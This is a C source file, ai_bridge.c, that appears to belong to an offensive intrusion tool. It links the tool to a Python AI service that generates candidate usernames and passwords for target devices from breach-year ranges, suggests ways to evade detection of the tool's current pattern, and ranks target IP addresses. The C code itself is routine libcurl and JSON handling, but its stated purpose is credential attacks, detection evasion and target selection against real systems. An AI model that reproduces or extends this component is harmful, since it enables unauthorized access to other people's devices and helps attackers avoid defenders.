/**
 * @file ai_bridge.c
 * @brief AI integration bridge implementation
 * 
 * This module communicates with Python AI services via HTTP/JSON.
 * It handles credential generation, evasion techniques, and ML-based optimizations.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <curl/curl.h>
#include <json-c/json.h>

#include "ai_bridge.h"
#include "../common/logger.h"

// Configuration
static struct {
    char api_endpoint[512];
    CURL *curl;
    bool initialized;
    uint32_t timeout_ms;
} g_ai_config = {
    .initialized = false,
    .timeout_ms = 30000  // 30 second timeout
};

// HTTP response buffer
typedef struct {
    char *data;
    size_t size;
} http_response_t;

// Forward declarations
static size_t http_write_callback(void *contents, size_t size, size_t nmemb, void *userp);
static int ai_bridge_http_post(const char *endpoint, const char *json_data, http_response_t *response);

int ai_bridge_init(const char *api_endpoint) {
    if (g_ai_config.initialized) {
        log_warn("AI bridge already initialized");
        return 0;
    }
    
    if (api_endpoint == NULL) {
        log_error("API endpoint is NULL");
        return -1;
    }
    
    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    g_ai_config.curl = curl_easy_init();
    
    if (g_ai_config.curl == NULL) {
        log_error("Failed to initialize CURL");
        curl_global_cleanup();
        return -1;
    }
    
    strncpy(g_ai_config.api_endpoint, api_endpoint, sizeof(g_ai_config.api_endpoint) - 1);
    g_ai_config.initialized = true;
    
    log_info("AI bridge initialized: endpoint=%s", api_endpoint);
    
    return 0;
}

int ai_bridge_generate_credentials(
    ai_credential_request_t *request,
    ai_credential_t *credentials,
    size_t max_credentials
) {
    if (!g_ai_config.initialized) {
        log_error("AI bridge not initialized");
        return -1;
    }
    
    if (request == NULL || credentials == NULL || max_credentials == 0) {
        log_error("Invalid parameters");
        return -1;
    }
    
    // Build JSON request
    json_object *jreq = json_object_new_object();
    json_object_object_add(jreq, "target_device", json_object_new_string(request->target_device));
    json_object_object_add(jreq, "target_os", json_object_new_string(request->target_os));
    json_object_object_add(jreq, "breach_year_start", json_object_new_int(request->breach_year_start));
    json_object_object_add(jreq, "breach_year_end", json_object_new_int(request->breach_year_end));
    json_object_object_add(jreq, "max_credentials", json_object_new_int(max_credentials));
    
    const char *json_str = json_object_to_json_string(jreq);
    
    // Send HTTP request
    http_response_t response = {0};
    char endpoint[512];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
    snprintf(endpoint, sizeof(endpoint), "%s/api/credentials/generate", g_ai_config.api_endpoint);
#pragma GCC diagnostic pop

    int result = ai_bridge_http_post(endpoint, json_str, &response);
    json_object_put(jreq);
    
    if (result < 0) {
        log_error("Failed to send credential generation request");
        return -1;
    }
    
    // Parse JSON response
    json_object *jresp = json_tokener_parse(response.data);
    if (jresp == NULL) {
        log_error("Failed to parse JSON response");
        free(response.data);
        return -1;
    }
    
    json_object *jcreds;
    if (!json_object_object_get_ex(jresp, "credentials", &jcreds)) {
        log_error("Response missing 'credentials' field");
        json_object_put(jresp);
        free(response.data);
        return -1;
    }
    
    size_t count = json_object_array_length(jcreds);
    if (count > max_credentials) {
        count = max_credentials;
    }
    
    for (size_t i = 0; i < count; i++) {
        json_object *jcred = json_object_array_get_idx(jcreds, i);
        
        json_object *juser, *jpass, *jconf, *jsrc;
        json_object_object_get_ex(jcred, "username", &juser);
        json_object_object_get_ex(jcred, "password", &jpass);
        json_object_object_get_ex(jcred, "confidence", &jconf);
        json_object_object_get_ex(jcred, "source", &jsrc);
        
        if (juser && jpass) {
            strncpy(credentials[i].username, json_object_get_string(juser), 63);
            strncpy(credentials[i].password, json_object_get_string(jpass), 63);
            credentials[i].confidence_score = jconf ? json_object_get_double(jconf) : 0.5f;
            if (jsrc) {
                strncpy(credentials[i].source, json_object_get_string(jsrc), 127);
            }
        }
    }
    
    json_object_put(jresp);
    free(response.data);
    
    log_info("Generated %zu credentials via AI", count);
    
    return count;
}

int ai_bridge_get_evasion_techniques(
    const char *current_pattern,
    char suggestions[][256],
    size_t max_suggestions
) {
    if (!g_ai_config.initialized) {
        log_error("AI bridge not initialized");
        return -1;
    }
    
    // Build JSON request
    json_object *jreq = json_object_new_object();
    json_object_object_add(jreq, "current_pattern", json_object_new_string(current_pattern));
    json_object_object_add(jreq, "max_suggestions", json_object_new_int(max_suggestions));
    
    const char *json_str = json_object_to_json_string(jreq);
    
    // Send request
    http_response_t response = {0};
    char endpoint[512];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
    snprintf(endpoint, sizeof(endpoint), "%s/api/evasion/suggest", g_ai_config.api_endpoint);
#pragma GCC diagnostic pop
    
    int result = ai_bridge_http_post(endpoint, json_str, &response);
    json_object_put(jreq);
    
    if (result < 0) {
        return -1;
    }
    
    // Parse response
    json_object *jresp = json_tokener_parse(response.data);
    if (jresp == NULL) {
        free(response.data);
        return -1;
    }
    
    json_object *jsuggs;
    if (!json_object_object_get_ex(jresp, "suggestions", &jsuggs)) {
        json_object_put(jresp);
        free(response.data);
        return -1;
    }
    
    size_t count = json_object_array_length(jsuggs);
    if (count > max_suggestions) {
        count = max_suggestions;
    }
    
    for (size_t i = 0; i < count; i++) {
        json_object *jsugg = json_object_array_get_idx(jsuggs, i);
        const char *sugg_str = json_object_get_string(jsugg);
        if (sugg_str) {
            strncpy(suggestions[i], sugg_str, 255);
        }
    }
    
    json_object_put(jresp);
    free(response.data);
    
    log_info("Got %zu evasion suggestions from AI", count);
    
    return count;
}

int ai_bridge_prioritize_targets(
    uint32_t *targets,
    size_t target_count,
    float *scores
) {
    if (!g_ai_config.initialized) {
        log_error("AI bridge not initialized");
        return -1;
    }
    
    // Build JSON request with IP addresses
    json_object *jreq = json_object_new_object();
    json_object *jips = json_object_new_array();
    
    for (size_t i = 0; i < target_count; i++) {
        uint32_t ip = targets[i];
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%u.%u.%u.%u",
                (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
                (ip >> 8) & 0xFF, ip & 0xFF);
        json_object_array_add(jips, json_object_new_string(ip_str));
    }
    
    json_object_object_add(jreq, "targets", jips);
    
    const char *json_str = json_object_to_json_string(jreq);
    
    // Send request
    http_response_t response = {0};
    char endpoint[512];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
    snprintf(endpoint, sizeof(endpoint), "%s/api/targets/prioritize", g_ai_config.api_endpoint);
#pragma GCC diagnostic pop
    
    int result = ai_bridge_http_post(endpoint, json_str, &response);
    json_object_put(jreq);
    
    if (result < 0) {
        return -1;
    }
    
    // Parse scores
    json_object *jresp = json_tokener_parse(response.data);
    if (jresp == NULL) {
        free(response.data);
        return -1;
    }
    
    json_object *jscores;
    if (!json_object_object_get_ex(jresp, "scores", &jscores)) {
        json_object_put(jresp);
        free(response.data);
        return -1;
    }
    
    size_t count = json_object_array_length(jscores);
    for (size_t i = 0; i < count && i < target_count; i++) {
        json_object *jscore = json_object_array_get_idx(jscores, i);
        scores[i] = json_object_get_double(jscore);
    }
    
    json_object_put(jresp);
    free(response.data);
    
    return 0;
}

bool ai_bridge_is_available(void) {
    if (!g_ai_config.initialized) {
        return false;
    }
    
    // Try a simple health check
    char endpoint[512];
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
    snprintf(endpoint, sizeof(endpoint), "%s/health", g_ai_config.api_endpoint);
#pragma GCC diagnostic pop
    
    http_response_t response = {0};
    int result = ai_bridge_http_post(endpoint, "{}", &response);
    
    if (response.data) {
        free(response.data);
    }
    
    return result == 0;
}

void ai_bridge_cleanup(void) {
    if (!g_ai_config.initialized) {
        return;
    }
    
    if (g_ai_config.curl) {
        curl_easy_cleanup(g_ai_config.curl);
    }
    
    curl_global_cleanup();
    
    g_ai_config.initialized = false;
    
    log_info("AI bridge cleanup complete");
}

// HTTP write callback
static size_t http_write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    http_response_t *response = (http_response_t *)userp;
    
    // BUG FIX: Use a temporary pointer so that on realloc failure we don't
    // lose the original response->data pointer (use-after-free / memory leak).
    char *ptr = realloc(response->data, response->size + realsize + 1);
    if (ptr == NULL) {
        log_error("Out of memory in HTTP callback (requested %zu bytes)", 
                  response->size + realsize + 1);
        // response->data is still valid — caller must free it on error path
        return 0;  // Signal CURL to abort the transfer
    }
    
    response->data = ptr;
    memcpy(&(response->data[response->size]), contents, realsize);
    response->size += realsize;
    response->data[response->size] = '\0';
    
    return realsize;
}

// Send HTTP POST request
static int ai_bridge_http_post(const char *endpoint, const char *json_data, http_response_t *response) {
    if (!g_ai_config.curl) {
        return -1;
    }
    
    response->data = malloc(1);
    response->size = 0;
    
    curl_easy_setopt(g_ai_config.curl, CURLOPT_URL, endpoint);
    curl_easy_setopt(g_ai_config.curl, CURLOPT_POSTFIELDS, json_data);
    curl_easy_setopt(g_ai_config.curl, CURLOPT_WRITEFUNCTION, http_write_callback);
    curl_easy_setopt(g_ai_config.curl, CURLOPT_WRITEDATA, (void *)response);
    curl_easy_setopt(g_ai_config.curl, CURLOPT_TIMEOUT_MS, g_ai_config.timeout_ms);
    
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(g_ai_config.curl, CURLOPT_HTTPHEADER, headers);
    
    CURLcode res = curl_easy_perform(g_ai_config.curl);
    
    curl_slist_free_all(headers);
    
    if (res != CURLE_OK) {
        log_error("CURL request failed: %s", curl_easy_strerror(res));
        free(response->data);
        response->data = NULL;
        return -1;
    }
    
    long http_code = 0;
    curl_easy_getinfo(g_ai_config.curl, CURLINFO_RESPONSE_CODE, &http_code);
    
    if (http_code != 200) {
        log_error("HTTP error: %ld", http_code);
        free(response->data);
        response->data = NULL;
        return -1;
    }
    
    return 0;
}
